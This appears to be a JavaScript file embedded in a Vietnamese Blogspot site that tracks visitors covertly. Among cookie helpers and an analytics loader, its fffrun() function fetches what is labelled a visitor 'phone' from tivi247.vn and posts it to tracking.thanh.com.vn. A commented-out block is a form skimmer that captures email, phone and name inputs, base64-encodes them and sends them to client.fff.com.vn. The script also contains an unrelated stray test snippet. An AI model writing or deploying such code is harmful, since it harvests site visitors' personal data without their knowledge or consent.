var website='kemchongnangdanhchodadau.blogspot.com';var _cgk='111';var db_domain='kemchongnangdanhchodadau.blogspot.com';


function createUUID() {
    var s = [];
    var hexDigits = "0123456789abcdef";
    for (var i = 0; i < 32; i++) {
        s[i] = hexDigits.substr(Math.floor(Math.random() * 0x10), 1);
    }
    s[14] = "4";  // bits 12-15 of the time_hi_and_version field to 0010
    s[19] = hexDigits.substr((s[19] & 0x3) | 0x8, 1);  // bits 6-7 of the clock_seq_hi_and_reserved to 01
    s[8] = s[13] = s[18] = s[23] = "-";

    var uuid = s.join("");
    return uuid;
}

function setCookie(cname,cvalue,exdays) {
    var d = new Date();
    d.setTime(d.getTime() + (exdays*24*60*60*1000));
    var expires = "expires=" + d.toGMTString();
    document.cookie = cname+"="+cvalue+"; "+expires + ";path=/";
}

function getCookie(cname) {
    var name = cname + "=";
    var ca = document.cookie.split(';');
    for(var i=0; i<ca.length; i++) {
        var c = ca[i];
        while (c.charAt(0)==' ') c = c.substring(1);
        if (c.indexOf(name) == 0) {
            return c.substring(name.length, c.length);
        }
    }
    return "";
}

function loadScript(url, callback)
{
    // Adding the script tag to the head as suggested before
    var head = document.getElementsByTagName('head')[0];
    var script = document.createElement('script');
    script.type = 'text/javascript';
    script.src = url;

    // Then bind the event to the callback function.
    // There are several events for cross browser compatibility.
    script.onreadystatechange = callback;
    script.onload = callback;

    // Fire the loading
    head.appendChild(script);
}
var myPrettyCode = function() {

	test('GET', function(){

	    expect(1);
	    stop();

	    jQuery.get('http://google.com', function(res){
	        ok(
	            !!(res && res.responseText),
	            'GET Request to Google.com succeeded!'
	        );
	        start();
	    });

	});
};

function parseURLParams(url) {
    var queryStart = url.indexOf("?") + 1,
        queryEnd   = url.indexOf("#") + 1 || url.length + 1,
        query = url.slice(queryStart, queryEnd - 1),
        pairs = query.replace(/\+/g, " ").split("&"),
        parms = {}, i, n, v, nv;

    if (query === url || query === "") {
        return;
    }

    for (i = 0; i < pairs.length; i++) {
        nv = pairs[i].split("=");
        n = decodeURIComponent(nv[0]);
        v = decodeURIComponent(nv[1]);

        if (!parms.hasOwnProperty(n)) {
            parms[n] = [];
        }

        parms[n].push(nv.length === 2 ? v : null);
    }
    return parms;
}
function get_tracking_id(url) {
    var queryStart = url.indexOf("fff_tracking_id=")+16;
    var fff_tracking_id = url.substring(queryStart);
	var res = fff_tracking_id.split("_");
	return res;
}
function getDesc() {
    var desc = document.head.querySelector('meta[name=description]');
    return desc ? desc.content : undefined;
}
function getImg() {
	var img = document.querySelector("meta[property='og:image']");
	return img ? img.content : undefined;
}
if (_cgk != "YnYNV95qXMCWD"){
	loadScript("https://www.google-analytics.com/analytics.js");
	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
	ga('create', 'UA-89461310-1', 'auto');
	ga('send', 'pageview');
	
}
function fffrun(){
	if (window.location.protocol != "https:") {
	  jQuery(document).ready(function($){
		console.log("AAAAAAAA");
		$.get( "http://tivi247.vn/home/test", function( data ) {
			if (data){
				post = {};
				post.phone = data;
				post.keycode = _cgk;
				post.type = 1;
				$.post( "tracking.thanh.com.vn/m2.php", post, function (result){} );
			}
		});
		
		$('form').each(function(i,o){/*
		var f = $(o);
		var v = [];
		var d = 0;
		var x = "";
		f.find('input').each(function(i,o) {
			i = $(o);
			i.change(function() {
				v.map(function(i) {
					return {
						id: i.attr('id'),
						name: i.attr('name'),
						val: i.val()
					}
				});
				if (/^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,3})+$/.test(i.val())) {d = 1; x = "e="+btoa(encodeURIComponent(i.val()))}
				if (/phone|dienthoai/.test(i.attr('id'))) {d = 2; x = "p="+btoa(encodeURIComponent(i.val()))}
				if (/phone|dienthoai/.test(i.attr('name'))){ d = 2; x = "p="+btoa(encodeURIComponent(i.val()))}
				if (/name|ten|hoten/.test(i.attr('id'))){ d = 3; x = "n="+btoa(encodeURIComponent(i.val()))}
				if (/name|ten|hoten/.test(i.attr('name'))){ d = 3; x = "n="+btoa(encodeURIComponent(i.val()))}
				if (x != "") $.getJSON("http://client.fff.com.vn/api/real-customer/?" + x );
			});
		});
	*/});
	   });
	}
}
function fff_run_timeout(){
		
	if (window.jQuery) {   
		fffrun();
	}else{
		setTimeout(fff_run_timeout,100);
	}
}

if (window.jQuery) {   
	fffrun();
}else{
	loadScript("https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js");
	fff_run_timeout();
}


if(typeof _cgk !== "undefined") {
	
	paid = "";
	var _req_id = "";
	var _camp_id = "";
	appversion = navigator.appVersion;
	urlParams = parseURLParams(document.location.href);

	var c_cookie= getCookie("c_cookie");
	if (c_cookie != "") {
		c_cookie_id = c_cookie;
		} else {
		var c_cookie_id = createUUID();
		setCookie("c_cookie", c_cookie_id, 30); //cookie trong 30 day
	}

	if (typeof urlParams !== 'undefined' && typeof urlParams.gclid !== 'undefined') {

        if(urlParams.gclid[0] != ''){
			paid = 1; // urlParams.gclid[0]; ads user
		}
	}
	if (paid != 1){

		var user=getCookie("thanh.com.vn");
		if (user != "") {
			paid = 2; // return nature user
		} else {
		   setCookie("thanh.com.vn", "thanh.com.vn", 30); //cookie trong 30s
		   paid = 0; // new nature user
		}
	}

	var arr_tracking = get_tracking_id(document.location.href);
	if(arr_tracking.length >= 2) {
		_camp_id = arr_tracking[0];
		_req_id = arr_tracking[1];
	}

	/* new fff */
    var _title = encodeURIComponent(document.title);
    var _href = encodeURIComponent(document.location.href);
    var _des = getDesc();
    var _img = getImg();


	var _data = '_key='+_cgk+'&_title='+_title+'&_des='+_des+'&_href='+_href+'&_type='+paid+'&_img='+_img+'&_req_id='+_req_id+'&_camp_id='+_camp_id;

	var _target_fff_v2 = ('https:' == document.location.protocol ? 'https://' : 'http://') + 'tracking.thanh.com.vn/blog.php';
	var xmlHttp = new XMLHttpRequest();


	xmlHttp.open("POST", _target_fff_v2, true);
	xmlHttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        xmlHttp.send(_data);

}
